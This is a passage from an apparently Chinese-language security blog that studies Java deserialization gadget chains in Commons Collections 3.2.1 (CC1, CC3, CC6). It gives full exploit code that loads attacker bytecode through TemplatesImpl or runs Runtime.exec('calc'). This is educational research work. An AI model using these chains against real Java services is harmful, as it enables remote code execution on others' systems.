tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">//调用templates.newTransformer();</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">		<span class="comment">//CC1</span></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;b&quot;</span>);</span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; c = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; annotationInvocationdhdlerConstructor = c.getDeclaredConstructor(Class.class, 			Map.class);</span><br><span class="line">        annotationInvocationdhdlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationdhdlerConstructor.newInstance(Target.class, transformedMap);</span><br><span class="line"><span class="comment">//        serialize(o);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oss</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oss.writeObject(obj);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="CC6的TemplatesImpl-的实现方式"><a href="#CC6的TemplatesImpl-的实现方式" class="headerlink" title="CC6的TemplatesImpl 的实现方式"></a>CC6的TemplatesImpl 的实现方式</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">//调用templates.newTransformer();</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">		<span class="comment">//CC6</span></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; lazymap = LazyMap.decorate(map, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;v&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map2.put(tiedMapEntry, <span class="string">&quot;v&quot;</span>);</span><br><span class="line">        lazymap.remove(<span class="string">&quot;v&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;LazyMap&gt; c = LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazymap,chainedTransformer);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(map2);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oss</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oss.writeObject(obj);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="CC3调用链分析"><a href="#CC3调用链分析" class="headerlink" title="CC3调用链分析"></a>CC3调用链分析</h2><p>因为只需要调用 <code>TemplatesImpl</code> 类的 <code>newTransformer()</code> 方法，便可以进行命令执行，所以我们，查找谁调用了 <code>newTransformer()</code> </p>
<p><code> com.sun.org.apache.xalan.internal.xslt.trax#TrAXFilter.TrAXFilter()</code>,因为<code>TrAXFilter()类的newTransformer()</code>在构造函数里面，方便我们传参，所以选择它，但有个问题，<code>TrAXFilter</code>类并没有继承<code>Serializable</code> 接口，不能序列化所以我们只能从<code>TrAXFilter</code>的Class入手。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240528100031807.png" alt="image-20240528100031807"></p>
<p>CC3的作者没有调用 <code>InvokerTransformer</code>，而是调用了一个新的类 <code>InstantiateTransformer</code>。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240528101227501.png" alt="image-20240528101227501"></p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240528111906340.png" alt="image-20240528111906340"></p>
<h3 id="CC3链EXP"><a href="#CC3链EXP" class="headerlink" title="CC3链EXP"></a>CC3链EXP</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\14341\\Desktop\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="comment">//    templates.newTransformer();</span></span><br><span class="line">		</span><br><span class="line">		<span class="comment">//为了调用Templates.newTransformer();</span></span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line">       </span><br><span class="line">        instantiateTransformer.transform(TrAXFilter.class);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="CC1实现CC3完整版"><a href="#CC1实现CC3完整版" class="headerlink" title="CC1实现CC3完整版"></a>CC1实现CC3完整版</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">         <span class="comment">//实现instantiateTransformer.transform(TrAXFilter.class);</span></span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]						&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                instantiateTransformer</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="comment">//CC1</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; c = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; annotationInvocationdhdlerConstructor = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationInvocationdhdlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) annotationInvocationdhdlerConstructor.newInstance(Target.class, lazyMap);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, h);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationdhdlerConstructor.newInstance(Override.class, mapProxy);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(o);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oss</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oss.writeObject(obj);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="CC6实现CC3完整版"><a href="#CC6实现CC3完整版" class="headerlink" title="CC6实现CC3完整版"></a>CC6实现CC3完整版</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">		</span><br><span class="line">       <span class="comment">//实现instantiateTransformer.transform(TrAXFilter.class);</span></span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]						&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line">        </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                instantiateTransformer</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="comment">//CC6</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; lazymap = LazyMap.decorate(map, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;v&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map2.put(tiedMapEntry, <span class="string">&quot;v&quot;</span>);</span><br><span class="line">        lazymap.remove(<span class="string">&quot;v&quot;</span>);</span><br><span class="line">		</span><br><span class="line">        <span class="comment">// 在 put 之后通过反射修改值  </span></span><br><span class="line">        Class&lt;LazyMap&gt; c = LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazymap,chainedTransformer);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(map2);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oss</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oss.writeObject(obj);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="">java安全漫谈-Java中动态加载字节码的那些方法</a></p>
<p><a href="https://www.bilibili.com/video/BV16h411z7o9?p=4&vd_source=d195054a6a081ba07486dcc86c6ba707">类的动态加载</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化CommonsCollections篇-CC6(最好用的CC链)</title>
    <url>/2024/05/25/JAVA%E5%AE%89%E5%85%A8/CC6/</url>
    <content><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
<li><p>JAVA版本JAVA 21</p>
</li>
<li><p>commons-collections 3.2.1</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;3.2.1&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>

<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>CC1现在来说的话比较鸡肋。因为在8u71以后<code>AnnotationInvocationHandler.readObject()</code>改变了。</p>
<p>为了解决高版本的利用问题ysoserial给出了解决方案CommonsCollections6，也就是我们平常称的CC6。</p>
<p>其实后面利用链和CC1是一样的,<code>LazyMap.get()</code></p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240525145206477.png" alt="image-20240525145206477"></p>
<h2 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h2><p>从ysoserial可以看出链首是HashMap，其实HashMap我们挺熟悉。<code>HashMap.readObject()-&gt;HashMap.put()-&gt;HashMap.hash().(key)HashCode()</code></p>
<p>所以现在只需要有一个类的<code>HashCode()</code>调用了<code>get()</code>就可以将这整段链链接起来。</p>
<h3 id="攻击链分析"><a href="#攻击链分析" class="headerlink" title="攻击链分析"></a>攻击链分析</h3><p>作者是发现了<code>TiedMapEntry.HashCode().getValue()</code>中调用了<code>get()</code>,那这就可以把前后两段链链接起来。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240525163703284.png" alt="image-20240525163703284"></p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240525163727555.png" alt="image-20240525163727555"></p>
<p>完整利用链</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240525172135830.png" alt="image-20240525172135830"></p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>后面部分是一样的直接复制粘贴CC1的就行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line">    	<span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);</span><br></pre></td></tr></table></figure>

<p>接下来直接<code>new TiedMapEntry</code>，看<code>TiedMapEntry</code>的构造器，所以map可以直接传入之前的chainedTransformer，key随便传。</p>
